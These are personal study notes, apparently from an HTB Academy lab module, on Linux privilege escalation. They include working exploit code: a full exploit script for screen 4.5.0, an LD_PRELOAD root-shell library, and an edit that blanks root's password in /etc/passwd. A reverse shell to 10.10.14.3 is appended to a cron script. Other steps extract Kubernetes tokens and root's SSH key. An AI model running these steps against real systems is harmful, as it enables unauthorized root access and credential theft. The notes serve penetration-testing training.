---
title: "Linux PrivEsc"
date: 2026-07-29 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "Linux privilege escalation vectors: Path variable abuse, SUID/GUID binaries, Capabilities, Sudo rights, and Kernel exploits."
image:
  path: /assets/img/posts/linux_privesc.jpg
  alt: Linux PrivEsc
---

# base commands to check

#### **List Current Processes**

```bash
        shellsession
Fau5t@htb[/htb]$ ps aux| grep root
```

#### **List Current Terminal-Attached Processes**

```
        shellsession
Fau5t@htb[/htb]$ ps au
```

#### **SSH Directory Contents**

```
        shellsession
Fau5t@htb[/htb]$ ls -l~/.ssh
```

#### **Bash History**

```
        shellsession
Fau5t@htb[/htb]$ history
```

#### **Sudo - List User's Privileges**

```
        shellsession
Fau5t@htb[/htb]$ sudo -l
```

`Configuration Files`: Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as `.conf` and `.config`, for usernames, passwords, and other secrets.

`Readable Shadow File`: If the shadow file is readable, you will be able to gather password hashes for all users who have a password set. While this does not guarantee further access, these hashes can be subjected to an offline brute-force attack to recover the cleartext password.

`Password Hashes in /etc/passwd`: Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the `shadow` file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.

#### **Passwd**

```
        shellsession
Fau5t@htb[/htb]$ cat /etc/passwd
```

`Cron Jobs`: Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.

#### **Cron Jobs**

```
        shellsession
Fau5t@htb[/htb]$ ls -la /etc/cron.daily/
```

#### **File Systems & Additional Drives**

```
        shellsession
Fau5t@htb[/htb]$ lsblk
```

#### **Find Writable Files**

```
        shellsession
Fau5t@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w2>/dev/null
```

# **Gaining Situational Awareness**

Typically we'll want to run a few basic commands to orient ourselves:

- `whoami` - what user are we running as
- `id` - what groups does our user belong to?
- `hostname` - what is the server named, can we gather anything from the naming convention?
- `ifconfig` or `ip a` - what subnet did we land in, does the host have additional NICs in other subnets?
- `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.

Next we'll want to check out our current user's PATH, which is where the Linux system looks every time a command is executed for any executables to match the name of what we type, i.e., `id` which on this system is located at `/usr/bin/id`. As we'll see later in this module, if the PATH variable for a target user is misconfigured we may be able to leverage it to escalate privileges. For now we'll note it down and add it to our notetaking tool of choice.

```bash
        shellsession
Fau5t@htb[/htb]$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

We can also check out all environment variables that are set for our current user, we may get lucky and find something sensitive in there such as a password. We'll note this down and move on.

```bash
        shellsession
Fau5t@htb[/htb]$ envSHELL=/bin/bashPWD=/home/htb-studentLOGNAME=htb-studentXDG_SESSION_TYPE=ttyMOTD_SHOWN=pamHOME=/home/htb-studentLANG=en_US.UTF-8<SNIP>
```

Next let's note down the Kernel version. We can do some searches to see if the target is running a vulnerable Kernel (which we'll get to take advantage of later on in the module) which has some known public exploit PoC. We can do this a few ways, another way would be `cat /proc/version` but we'll use the `uname -a` command.

```bash
        shellsession
Fau5t@htb[/htb]$ uname -aLinux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

Next we can take a look at the drives and any shares on the system. First, we can use the `lsblk` command to enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.). If we discover and can mount an additional drive or unmounted file system, we may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

```bash
        shellsession
Fau5t@htb[/htb]$ lsblk
```

We should also check for mounted drives and unmounted drives. Can we mount an umounted drive and gain access to sensitive data? Can we find any types of credentials in `fstab` for mounted drives by grepping for common words such as password, username, credential, etc in `/etc/fstab`?

```bash
        shellsession
Fau5t@htb[/htb]$ cat /etc/fstab
```

We'll also want to check which users have login shells. Once we see what shells are on the system, we can check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a `shellshock` exploit.

```bash
        shellsession
Fau5t@htb[/htb]$ grep"sh$" /etc/passwd
```

#### **Installed Packages**

```bash
        shellsession
Fau5t@htb[/htb]$ apt list --installed| tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

#### **Sudo Version**

```
        shellsession
Fau5t@htb[/htb]$ sudo -V
```

#### **Binaries**

```
        shellsession
Fau5t@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/
```

[GTFObins](https://gtfobins.github.io/) provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. With the next oneliner, we can compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.

#### **GTFObins**

```
        shellsession
Fau5t@htb[/htb]$ for iin $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO:$i";fi; done
```

#### **Configuration Files**

```bash
        shellsession
Fau5t@htb[/htb]$ find / -type f \(-name *.conf -o -name *.config \)-exec ls -l {} \;2>/dev/null
```

#### **Scripts**

```
        shellsession
Fau5t@htb[/htb]$ find / -type f -name"*.sh" 2>/dev/null| grep -v "src\|snap\|share"
```

# Env based PrivEsc

## Path Abuse

As shown below, the conncheck script created in /usr/local/sbin will still run when in the /tmp directory because it was created in a directory specified in the PATH.

```bash
htb_student@NIX02:~$ pwd && conncheck
```

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

```bash
htb_student@NIX02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```bash
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.

```bash
htb_student@NIX02:~$ touch lshtb_student@NIX02:~$ echo'echo "PATH ABUSE!!"' > lshtb_student@NIX02:~$ chmod +x ls
```

```bash
htb_student@NIX02:~$ ls
PATH ABUSE!!
```

# Permission based PrivEsc

The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.

```
    shellsession
```

Fau5t@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

- rwsr-xr-x 1 root root 16728 Sep 1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep 1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30 2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17 2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30 2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 38984 Jun 14 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Jan 18 2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 85832 Nov 30 2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 18 2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23376 Jan 18 2016 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 17 2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 17 2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 17 2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul 4 2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17 2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 May 17 2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May 17 2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 May 17 2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 10624 May 9 2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 94240 Jun 9 14:54 /sbin/mount.nfs

It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. Many programs have additional features that can be leveraged to execute commands and, if the setuid bit is set on them, these can be used for our purpose.

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: find / -uid 0 -perm -6000 -type f 2>/dev/null. These files can be leveraged in the same manner as setuid binaries to escalate privileges.

```bash
Fau5t@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

- rwsr-sr-x 1 root root 85832 Nov 30 2017 /usr/lib/snapd/snap-confine
```

This resource has more information about the setuid and setgid bits, including how to set the bits.

GTFOBins
The GTFOBins project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files. For example, apt-get can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:

```bash
Fau5t@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
id

uid=0(root) gid=0(root) groups=0(root)
```

It is worth familiarizing ourselves with as many GTFOBins as possible to quickly identify misconfigurations when we land on a system that we must escalate our privileges to move further

### capabilities

| **Capability** | **Description** |
| --- | --- |
| `cap_sys_admin` | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. |
| `cap_sys_chroot` | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. |
| `cap_sys_ptrace` | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| `cap_sys_nice` | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. |
| `cap_sys_time` | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. |
| `cap_sys_resource` | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. |
| `cap_sys_module` | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. |
| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. |

| **Capability Values** | **Description** |
| --- | --- |
| `=` | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. |
| `+ep` | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. |
| `+ei` | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions. |
| `+p` | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

| **Capability** | **Description** |
| --- | --- |
| `cap_setuid` | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user. |
| `cap_setgid` | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group. |
| `cap_sys_admin` | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks. |

#### **Enumerating Capabilities**

```bash
        shellsession
Fau5t@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap{} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```bash
        shellsession
Fau5t@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

```bash
Fau5t@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
Fau5t@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

# Service based PrivEsc

## screen bug

Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

```bash
Fau5t@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

PoC::

```bash
# !/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

## crontabs

look what crontabs using

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

then you can include a shell to it

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

## lxc

```bash
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

```bash
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

```

```bash
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```bash
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root
```

#### **Docker Socket**

```bash
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

```bash
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l
```

## kubernetes

#### **Control Plane**

The Control Plane serves as the management layer. It consists of several crucial components, including:

| **Service** | **TCP Ports** |
| --- | --- |
| `etcd` | `2379`, `2380` |
| `API server` | `6443` |
| `Scheduler` | `10251` |
| `Controller Manager` | `10252` |
| `Kubelet API` | `10250` |
| `Read-Only Kubelet API` | `10255` |

```bash
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
    "kind": "Status",
    "apiVersion": "v1",
    "metadata": {},
    "status": "Failure",
    "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
    "reason": "Forbidden",
    "details": {},
    "code": 403
}

```

**Kubelet API - Extracting Pods**

```bash
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
```

**Kubeletctl - Extracting Pods**

```bash
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤

```

**Kubelet API - Available Commands**

```bash
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│
```

**Kubelet API - Executing Commands**

```bash
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

---

### **Privilege Escalation**

To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

**Kubelet API - Extracting Tokens**

```bash
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

**Kubelet API - Extracting Certificates**

```bash
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.

```bash
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

```

Here we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:

```bash
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created

cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME    READY   STATUS  RESTARTS    AGE
nginx   1/1     Running 0           23m
privesc 1/1     Running 0           12s
```

**Extracting Root's SSH Key**

```bash
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

---

--BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```

## logrotate

To exploit logrotate, we need some requirements that we have to fulfill.

we need write permissions on the log files
logrotate must run as a privileged user or root
vulnerable versions:
3.8.6
3.11.0
3.15.0
3.18.0
There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named logrotten. We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

# Linux Internal-based Privesc

## kernel exploits

```bash
Fau5t@htb[/htb]$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
Fau5t@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next download it to the system using `wget` or another file transfer method. We can compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.

```bash
Fau5t@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
Fau5t@htb[/htb]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

## **LD_PRELOAD Privilege Escalation**

Let's see an example of how we can utilize the [LD_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.

```bash
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

## python library hijacking (skipped shared object hijacking)

```bash
htb-student@lpenix:~$ sudo -l

Matching Defaults entries for htb-student on lpenix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

```bash
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py

```

found a used module, checking contents

```bash
        shellsession
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():

htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

```

**Module Contents - Hijacking**

```bash
...SNIP...

def virtual_memory():

    ...SNIP...
    #### Hijacking
    import os
    os.system('id')
    

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

```bash
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.2
```

In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:

**PYTHONPATH Listing**

```bash
        shellsession
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.

In order for this to make a bit more sense, let us continue with the previous example and show how this can be exploited. Previously, the `psutil` module was imported into the `mem_status.py` script. We can see `psutil`'s default installation location by issuing the following command:

```bash
        shellsession
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...

```

**Misconfigured Directory Permissions**

```bash
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

```bash
#psutil.py
import os

def virtual_memory():
    os.system('id')

```

In order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack. This is critical as without either of these conditions being `true`, we will not be able perform this attack. After creating this file containing the example of our previous hijacking script, we have successfully prepped the system for exploitation.

Let us once again run the `mem_status.py` script using `sudo` like in the previous example.

### **PYTHONPATH Environment Variable**

In the previous example, we touched upon the term `PYTHONPATH`, however, didn't fully explain it's use and importance regarding the functionality of Python. `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

#### **Checking Sudo Privileges**

```bash
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.

```bash
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...

```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.

# recent zero days

sudo - check sudo version and sudo privileges

polkit 

A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the Dirty Cow vulnerability discovered in 2016. All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability.

